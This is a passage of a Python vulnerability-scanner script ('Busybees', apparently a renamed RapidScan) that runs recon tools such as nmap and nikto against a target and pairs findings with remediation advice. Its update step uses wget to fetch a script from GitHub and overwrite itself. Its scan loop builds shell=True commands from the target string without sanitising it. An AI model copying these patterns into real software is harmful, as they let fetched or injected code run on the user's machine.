                    [20, "Otherwise termed as BREACH atack, exploits the compression in the underlying HTTP protocol. An attacker will be able to obtain email addresses, session tokens, etc from the TLS encrypted web traffic.",
                            "Turning off TLS compression does not mitigate this vulnerability. First step to mitigation is to disable Zlib compression followed by other measures mentioned in this resource. http://breachattack.com/"],
                    [21, "Otherwise termed as Plain-Text Injection attack, which allows MiTM attackers to insert data into HTTPS sessions, and possibly other types of sessions protected by TLS or SSL, by sending an unauthenticated request that is processed retroactively by a server in a post-renegotiation context.",
                            "Detailed steps of remediation can be found from these resources. https://securingtomorrow.mcafee.com/technical-how-to/tips-securing-ssl-renegotiation/ https://www.digicert.com/news/2011-06-03-ssl-renego/ "],
                    [22, "This vulnerability allows attackers to steal existing TLS sessions from users.",
                            "Better advice is to disable session resumption. To harden session resumption, follow this resource that has some considerable information. https://wiki.crashtest-security.com/display/KB/Harden+TLS+Session+Resumption"],
                    [23, "This has nothing to do with security risks, however attackers may use this unavailability of load balancers as an advantage to leverage a denial of service attack on certain services or on the whole application itself.",
                            "Load-Balancers are highly encouraged for any web application. They improve performance times as well as data availability on during times of server outage. To know more information on load balancers and setup, check this resource. https://www.digitalocean.com/community/tutorials/what-is-load-balancing"],
                    [24, "An attacker can forwarded requests that comes to the legitimate URL or web application to a third party address or to the attacker's location that can serve malware and affect the end user's machine.",
                            "It is highly recommended to deploy DNSSec on the host target. Full deployment of DNSSEC will ensure the end user is connecting to the actual web site or other service corresponding to a particular domain name. For more information, check this resource. https://www.cloudflare.com/dns/dnssec/how-dnssec-works/"],
                    [25, "Attackers may find considerable amount of information from these files. There are even chances attackers may get access to critical information from these files.",
                            "It is recommended to block or restrict access to these files unless necessary."],
                    [26, "Attackers may find considerable amount of information from these directories. There are even chances attackers may get access to critical information from these directories.",
                            "It is recommended to block or restrict access to these directories unless necessary."],
                    [27, "May not be SQLi vulnerable. An attacker will be able to know that the host is using a backend for operation.",
                            "Banner Grabbing should be restricted and access to the services from outside would should be made minimum."],
                    [28, "An attacker will be able to steal cookies, deface web application or redirect to any third party address that can serve malware.",
                            "Input validation and Output Sanitization can completely prevent Cross Site Scripting (XSS) attacks. XSS attacks can be mitigated in future by properly following a secure coding methodology. The following comprehensive resource provides detailed information on fixing this vulnerability. https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"],
                    [29, "SSL related vulnerabilities breaks the confidentiality factor. An attacker may perform a MiTM attack, intrepret and eavesdrop the communication.",
                            "Proper implementation and upgraded version of SSL and TLS libraries are very critical when it comes to blocking SSL related vulnerabilities."],
                    [30, "Particular Scanner found multiple vulnerabilities that an attacker may try to exploit the target.",
                            "Refer to RS-Vulnerability-Report to view the complete information of the vulnerability, once the scan gets completed."],
                    [31, "Attackers may gather more information from subdomains relating to the parent domain. Attackers may even find other services from the subdomains and try to learn the architecture of the target. There are even chances for the attacker to find vulnerabilities as the attack surface gets larger with more subdomains discovered.",
                            "It is sometimes wise to block sub domains like development, staging to the outside world, as it gives more information to the attacker about the tech stack. Complex naming practices also help in reducing the attack surface as attackers find hard to perform subdomain bruteforcing through dictionaries and wordlists."],
                    [32, "Through this deprecated protocol, an attacker may be able to perform MiTM and other complicated attacks.",
                            "It is highly recommended to stop using this service and it is far outdated. SSH can be used to replace TELNET. For more information, check this resource https://www.ssh.com/ssh/telnet"],
                    [33, "This protocol does not support secure communication and there are likely high chances for the attacker to eavesdrop the communication. Also, many FTP programs have exploits available in the web such that an attacker can directly crash the application or either get a SHELL access to that target.",
                            "Proper suggested fix is use an SSH protocol instead of FTP. It supports secure communication and chances for MiTM attacks are quite rare."],
                    [34, "The StuxNet is level-3 worm that exposes critical information of the target organization. It was a cyber weapon that was designed to thwart the nuclear intelligence of Iran. Seriously wonder how it got here? Hope this isn't a false positive Nmap ;)",
                            "It is highly recommended to perform a complete rootkit scan on the host. For more information refer to this resource. https://www.symantec.com/security_response/writeup.jsp?docid=2010-071400-3123-99&tabid=3"],
                    [35, "WebDAV is supposed to contain multiple vulnerabilities. In some case, an attacker may hide a malicious DLL file in the WebDAV share however, and upon convincing the user to open a perfectly harmless and legitimate file, execute code under the context of that user",
                            "It is recommended to disable WebDAV. Some critical resource regarding disbling WebDAV can be found on this URL. https://www.networkworld.com/article/2202909/network-security/-webdav-is-bad---says-security-researcher.html"],
                    [36, "Attackers always do a fingerprint of any server before they launch an attack. Fingerprinting gives them information about the server type, content- they are serving, last modification times etc, this gives an attacker to learn more information about the target",
                            "A good practice is to obfuscate the information to outside world. Doing so, the attackers will have tough time understanding the server's tech stack and therefore leverage an attack."],
                    [37, "Attackers mostly try to render web applications or service useless by flooding the target, such that blocking access to legitimate users. This may affect the business of a company or organization as well as the reputation",
                            "By ensuring proper load balancers in place, configuring rate limits and multiple connection restrictions, such attacks can be drastically mitigated."],
                    [38, "Intruders will be able to remotely include shell files and will be able to access the core file system or they will be able to read all the files as well. There are even higher chances for the attacker to remote execute code on the file system.",
                            "Secure code practices will mostly prevent LFI, RFI and RCE attacks. The following resource gives a detailed insight on secure coding practices. https://wiki.sei.cmu.edu/confluence/display/seccode/Top+10+Secure+Coding+Practices"],
                    [39, "Hackers will be able to steal data from the backend and also they can authenticate themselves to the website and can impersonate as any user since they have total control over the backend. They can even wipe out the entire database. Attackers can also steal cookie information of an authenticated user and they can even redirect the target to any malicious address or totally deface the application.",
                            "Proper input validation has to be done prior to directly querying the database information. A developer should remember not to trust an end-user's input. By following a secure coding methodology attacks like SQLi, XSS and BSQLi. The following resource guides on how to implement secure coding methodology on application development. https://wiki.sei.cmu.edu/confluence/display/seccode/Top+10+Secure+Coding+Practices"],
                    [40, "Attackers exploit the vulnerability in BASH to perform remote code execution on the target. An experienced attacker can easily take over the target system and access the internal sources of the machine",
                            "This vulnerability can be mitigated by patching the version of BASH. The following resource gives an indepth analysis of the vulnerability and how to mitigate it. https://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability"],
                    [41, "Gives attacker an idea on how the address scheming is done internally on the organizational network. Discovering the private addresses used within an organization can help attackers in carrying out network-layer attacks aiming to penetrate the organization's internal infrastructure.",
                            "Restrict the banner information to the outside world from the disclosing service. More information on mitigating this vulnerability can be found here. https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed"],
                    [42, "There are chances for an attacker to manipulate files on the webserver.",
                            "It is recommended to disable the HTTP PUT and DEL methods incase if you don't use any REST API Services. Following resources helps you how to disable these methods. http://www.techstacks.com/howto/disable-http-methods-in-tomcat.html https://docs.oracle.com/cd/E19857-01/820-5627/gghwc/index.html https://developer.ibm.com/answers/questions/321629/how-to-disable-http-methods-head-put-delete-option/"],
                    [43, "Attackers try to learn more about the target from the amount of information exposed in the headers. An attacker may know what type of tech stack a web application is emphasizing and many other information.",
                            "Banner Grabbing should be restricted and access to the services from outside would should be made minimum."],
                    [44, "An attacker who successfully exploited this vulnerability could read data, such as the view state, which was encrypted by the server. This vulnerability can also be used for data tampering, which, if successfully exploited, could be used to decrypt and tamper with the data encrypted by the server.",
                            "Microsoft has released a set of patches on their website to mitigate this issue. The information required to fix this vulnerability can be inferred from this resource. https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-070"],
                    [45, "Any outdated web server may contain multiple vulnerabilities as their support would've been ended. An attacker may make use of such an opportunity to leverage attacks.",
                            "It is highly recommended to upgrade the web server to the available latest version."],
                    [46, "Hackers will be able to manipulate the URLs easily through a GET/POST request. They will be able to inject multiple attack vectors in the URL with ease and able to monitor the response as well",
                            "By ensuring proper sanitization techniques and employing secure coding practices it will be impossible for the attacker to penetrate through. The following resource gives a detailed insight on secure coding practices. https://wiki.sei.cmu.edu/confluence/display/seccode/Top+10+Secure+Coding+Practices"],
                    [47, "Since the attacker has knowledge about the particular type of backend the target is running, they will be able to launch a targetted exploit for the particular version. They may also try to authenticate with default credentials to get themselves through.",
                            "Timely security patches for the backend has to be installed. Default credentials has to be changed. If possible, the banner information can be changed to mislead the attacker. The following resource gives more information on how to secure your backend. http://kb.bodhost.com/secure-database-server/"],
                    [48, "Attackers may launch remote exploits to either crash the service or tools like ncrack to try brute-forcing the password on the target.",
                            "It is recommended to block the service to outside world and made the service accessible only through the a set of allowed IPs only really neccessary. The following resource provides insights on the risks and as well as the steps to block the service. https://www.perspectiverisk.com/remote-desktop-service-vulnerabilities/"],
                    [49, "Hackers will be able to read community strings through the service and enumerate quite a bit of information from the target. Also, there are multiple Remote Code Execution and Denial of Service vulnerabilities related to SNMP services.",
                            "Use a firewall to block the ports from the outside world. The following article gives wide insight on locking down SNMP service. https://www.techrepublic.com/article/lock-it-down-dont-allow-snmp-to-compromise-network-security/"],
                    [50, "Attackers will be able to find the logs and error information generated by the application. They will also be able to see the status codes that was generated on the application. By combining all these information, the attacker will be able to leverage an attack.",
                            "By restricting access to the logger application from the outside world will be more than enough to mitigate this weakness."],
                    [51, "Cyber Criminals mainly target this service as it is very easier for them to perform a remote attack by running exploits. WannaCry Ransomware is one such example.",
                            "Exposing SMB Service to the outside world is a bad idea, it is recommended to install latest patches for the service in order not to get compromised. The following resource provides a detailed information on SMB Hardening concepts. https://kb.iweb.com/hc/en-us/articles/115000274491-Securing-Windows-SMB-and-NetBios-NetBT-Services"]
            ]

# Tool Set
tools_precheck = [
                    ["wapiti"], ["whatweb"], ["nmap"], ["golismero"], ["host"], ["wget"], ["uniscan"], ["wafw00f"], ["dirb"], ["davtest"], ["theHarvester"], ["xsser"], ["dnsrecon"],["fierce"], ["dnswalk"], ["whois"], ["sslyze"], ["lbd"], ["golismero"], ["dnsenum"],["dmitry"], ["davtest"], ["nikto"], ["dnsmap"], ["amass"]
                 ]

def get_parser():

    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('-h', '--help', action='store_true', 
                        help='Show help message and exit.')
    parser.add_argument('-u', '--update', action='store_true', 
                        help='Update Busybees.')
    parser.add_argument('-s', '--skip', action='append', default=[],
                        help='Skip some tools', choices=[t[0] for t in tools_precheck])
    parser.add_argument('-n', '--nospinner', action='store_true', 
                        help='Disable the idle loader/spinner.')
    parser.add_argument('target', nargs='?', metavar='URL', help='URL to scan.', default='', type=str)
    return parser


# Shuffling Scan Order (starts)
scan_shuffle = list(zip(tool_names, tool_cmd, tool_resp, tool_status))
random.shuffle(scan_shuffle)
tool_names, tool_cmd, tool_resp, tool_status = zip(*scan_shuffle)
tool_checks = (len(tool_names) + len(tool_resp) + len(tool_status)) / 3 # Cross verification incase, breaks.
tool_checks = round(tool_checks)
# Shuffling Scan Order (ends)

# Tool Head Pointer: (can be increased but certain tools will be skipped)
tool = 0

# Run Test
runTest = 1

# For accessing list/dictionary elements
arg1 = 0
arg2 = 1
arg3 = 2
arg4 = 3
arg5 = 4
arg6 = 5

# Detected Vulnerabilities [will be dynamically populated]
rs_vul_list = list()
rs_vul_num = 0
rs_vul = 0

# Total Time Elapsed
rs_total_elapsed = 0

# Tool Pre Checker
rs_avail_tools = 0

# Checks Skipped
rs_skipped_checks = 0

if len(sys.argv) == 1:
    logo()
    helper()
    sys.exit(1)

args_namespace = get_parser().parse_args()

if args_namespace.nospinner:
    spinner.disabled = True

if args_namespace.help or (not args_namespace.update \
    and not args_namespace.target):
    logo()
    helper()
elif args_namespace.update:
    logo()
    print("Busybees is updating....Please wait.\n")
    spinner.start()
    # Checking internet connectivity first...
    rs_internet_availability = check_internet()
    if rs_internet_availability == 0:
        print("\t"+ bcolors.BG_ERR_TXT + "There seems to be some problem connecting to the internet. Please try again or later." +bcolors.ENDC)
        spinner.stop()
        sys.exit(1)
    cmd = 'sha1sum busybees.py | grep .... | cut -c 1-40'
    oldversion_hash = subprocess.check_output(cmd, shell=True)
    oldversion_hash = oldversion_hash.strip()
    os.system('wget -N https://raw.githubusercontent.com/skavngr/rapidscan/master/rapidscan.py -O busybees.py > /dev/null 2>&1')
    newversion_hash = subprocess.check_output(cmd, shell=True)
    newversion_hash = newversion_hash.strip()
    if oldversion_hash == newversion_hash :
        clear()
        print("\t"+ bcolors.OKBLUE +"You already have the latest version of Busybees." + bcolors.ENDC)
    else:
        clear()
        print("\t"+ bcolors.OKGREEN +"Busybees successfully updated to the latest version." +bcolors.ENDC)
    spinner.stop()
    sys.exit(1)

elif args_namespace.target:

    target = url_maker(args_namespace.target)
    #target = args_namespace.target
    os.system('rm /tmp/busybees* > /dev/null 2>&1') # Clearing previous scan files
    os.system('clear')
    os.system('setterm -cursor off')
    logo()
    print(bcolors.BG_HEAD_TXT+"[ Checking Available Security Scanning Tools Phase... Initiated. ]"+bcolors.ENDC)

    unavail_tools_names = list()

    while (rs_avail_tools < len(tools_precheck)):
        precmd = str(tools_precheck[rs_avail_tools][arg1])
        try:
            p = subprocess.Popen([precmd], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
            output, err = p.communicate()
            val = output + err
        except:
            print("\t"+bcolors.BG_ERR_TXT+"Busybees was terminated abruptly..."+bcolors.ENDC)
            sys.exit(1)
        
        # If the tool is not found or it's part of the --skip argument(s), disabling it
        if b"not found" in val or tools_precheck[rs_avail_tools][arg1] in args_namespace.skip :
            if b"not found" in val:
                print("\t"+bcolors.OKBLUE+tools_precheck[rs_avail_tools][arg1]+bcolors.ENDC+bcolors.BADFAIL+"...unavailable."+bcolors.ENDC)
            elif tools_precheck[rs_avail_tools][arg1] in args_namespace.skip :
                print("\t"+bcolors.OKBLUE+tools_precheck[rs_avail_tools][arg1]+bcolors.ENDC+bcolors.BADFAIL+"...skipped."+bcolors.ENDC)
            
            for scanner_index, scanner_val in enumerate(tool_names):
                if scanner_val[2] == tools_precheck[rs_avail_tools][arg1]:
                    scanner_val[3] = 0 # disabling scanner as it's not available.
                    unavail_tools_names.append(tools_precheck[rs_avail_tools][arg1])

        else:
            print("\t"+bcolors.OKBLUE+tools_precheck[rs_avail_tools][arg1]+bcolors.ENDC+bcolors.OKGREEN+"...available."+bcolors.ENDC)
        rs_avail_tools = rs_avail_tools + 1
        clear()
    unavail_tools_names = list(set(unavail_tools_names))
    if len(unavail_tools_names) == 0:
        print("\t"+bcolors.OKGREEN+"All Scanning Tools are available. Complete vulnerability checks will be performed by Busybees."+bcolors.ENDC)
    else:
        print("\t"+bcolors.WARNING+"Some of these tools "+bcolors.BADFAIL+str(unavail_tools_names)+bcolors.ENDC+bcolors.WARNING+" are unavailable or will be skipped. Busybees will still perform the rest of the tests. Install these tools to fully utilize the functionality of Busybees."+bcolors.ENDC)
    print(bcolors.BG_ENDL_TXT+"[ Checking Available Security Scanning Tools Phase... Completed. ]"+bcolors.ENDC)
    print("\n")
    print(bcolors.BG_HEAD_TXT+"[ Preliminary Scan Phase Initiated... Loaded "+str(tool_checks)+" vulnerability checks. ]"+bcolors.ENDC)
    #while (tool < 1):
    while(tool < len(tool_names)):
        print("["+tool_status[tool][arg3]+tool_status[tool][arg4]+"] Deploying "+str(tool+1)+"/"+str(tool_checks)+" | "+bcolors.OKBLUE+tool_names[tool][arg2]+bcolors.ENDC,)
        if tool_names[tool][arg4] == 0:
            print(bcolors.WARNING+"\nScanning Tool Unavailable. Skipping Test...\n"+bcolors.ENDC)
            rs_skipped_checks = rs_skipped_checks + 1
            tool = tool + 1
            continue
        try:
            spinner.start()
        except Exception as e:
            print("\n")
        scan_start = time.time()
        temp_file = "/tmp/busybees_temp_"+tool_names[tool][arg1]
        cmd = tool_cmd[tool][arg1]+target+tool_cmd[tool][arg2]+" > "+temp_file+" 2>&1"

        try:
            subprocess.check_output(cmd, shell=True)
        except KeyboardInterrupt:
            runTest = 0
        except:
            runTest = 1

        if runTest == 1:
                spinner.stop()
                scan_stop = time.time()
                elapsed = scan_stop - scan_start
                rs_total_elapsed = rs_total_elapsed + elapsed
                #print(bcolors.OKBLUE+"\b...Completed in "+display_time(int(elapsed))+bcolors.ENDC+"\n")
                sys.stdout.write(ERASE_LINE)
                print(bcolors.OKBLUE+"\nScan Completed in "+display_time(int(elapsed))+bcolors.ENDC, end='\r', flush=True)
                print("\n")
                #clear()
                rs_tool_output_file = open(temp_file).read()
                if tool_status[tool][arg2] == 0:
                    if tool_status[tool][arg1].lower() in rs_tool_output_file.lower():
                        #print "\t"+ vul_info(tool_resp[tool][arg2]) + bcolors.BADFAIL +" "+ tool_resp[tool][arg1] + bcolors.ENDC
                        vul_remed_info(tool,tool_resp[tool][arg2],tool_resp[tool][arg3])
                        rs_vul_list.append(tool_names[tool][arg1]+"*"+tool_names[tool][arg2])
                else:
                    if any(i in rs_tool_output_file for i in tool_status[tool][arg6]):
                        m = 1 # This does nothing.
                    else:
                        #print "\t"+ vul_info(tool_resp[tool][arg2]) + bcolors.BADFAIL +" "+ tool_resp[tool][arg1] + bcolors.ENDC
                        vul_remed_info(tool,tool_resp[tool][arg2],tool_resp[tool][arg3])
                        rs_vul_list.append(tool_names[tool][arg1]+"*"+tool_names[tool][arg2])
        else:
                runTest = 1
                spinner.stop()
                scan_stop = time.time()
                elapsed = scan_stop - scan_start
                rs_total_elapsed = rs_total_elapsed + elapsed
                #sys.stdout.write(CURSOR_UP_ONE) 
                sys.stdout.write(ERASE_LINE)
                #print("-" * terminal_size(), end='\r', flush=True)
                print(bcolors.OKBLUE+"\nScan Interrupted in "+display_time(int(elapsed))+bcolors.ENDC, end='\r', flush=True)
                print("\n"+bcolors.WARNING + "\tTest Skipped. Performing Next. Press Ctrl+Z to Quit Busybees.\n" + bcolors.ENDC)
                rs_skipped_checks = rs_skipped_checks + 1

        tool=tool+1

    print(bcolors.BG_ENDL_TXT+"[ Preliminary Scan Phase Completed. ]"+bcolors.ENDC)
    print("\n")

    #################### Report & Documentation Phase ###########################
    date = subprocess.Popen(["date", "+%Y-%m-%d"],stdout=subprocess.PIPE).stdout.read()[:-1].decode("utf-8")
    debuglog = "rs.dbg.%s.%s" % (target, date) 
    vulreport = "rs.vul.%s.%s" % (target, date)
    print(bcolors.BG_HEAD_TXT+"[ Report Generation Phase Initiated. ]"+bcolors.ENDC)
    if len(rs_vul_list)==0:
        print("\t"+bcolors.OKGREEN+"No Vulnerabilities Detected."+bcolors.ENDC)
    else:
        with open(vulreport, "a") as report:
            while(rs_vul < len(rs_vul_list)):
                vuln_info = rs_vul_list[rs_vul].split('*')
                report.write(vuln_info[arg2])
                report.write("\n------------------------\n\n")
                temp_report_name = "/tmp/busybees_temp_"+vuln_info[arg1]
                with open(temp_report_name, 'r') as temp_report:
                    data = temp_report.read()
                    report.write(data)
                    report.write("\n\n")
                temp_report.close()
                rs_vul = rs_vul + 1

            print("\tComplete Vulnerability Report for "+bcolors.OKBLUE+target+bcolors.ENDC+" named "+bcolors.OKGREEN+vulreport+bcolors.ENDC+" is available under the same directory Busybees resides.")

        report.close()
    # Writing all scan files output into RS-Debug-ScanLog for debugging purposes.
    for file_index, file_name in enumerate(tool_names):
        with open(debuglog, "a") as report:
            try:
                with open("/tmp/busybees_temp_"+file_name[arg1], 'r') as temp_report:
                        data = temp_report.read()
                        report.write(file_name[arg2])
                        report.write("\n------------------------\n\n")
                        report.write(data)
                        report.write("\n\n")
                temp_report.close()
            except:
                break
        report.close()

    print("\tTotal Number of Vulnerability Checks        : "+bcolors.BOLD+bcolors.OKGREEN+str(len(tool_names))+bcolors.ENDC)
    print("\tTotal Number of Vulnerability Checks Skipped: "+bcolors.BOLD+bcolors.WARNING+str(rs_skipped_checks)+bcolors.ENDC)
    print("\tTotal Number of Vulnerabilities Detected    : "+bcolors.BOLD+bcolors.BADFAIL+str(len(rs_vul_list))+bcolors.ENDC)
    print("\tTotal Time Elapsed for the Scan             : "+bcolors.BOLD+bcolors.OKBLUE+display_time(int(rs_total_elapsed))+bcolors.ENDC)
    print("\n")
    print("\tFor Debugging Purposes, You can view the complete output generated by all the tools named "+bcolors.OKBLUE+debuglog+bcolors.ENDC+" under the same directory.")
    print(bcolors.BG_ENDL_TXT+"[ Report Generation Phase Completed. ]"+bcolors.ENDC)

    os.system('setterm -cursor on')
    os.system('rm /tmp/busybees_te* > /dev/null 2>&1') # Clearing previous scan files
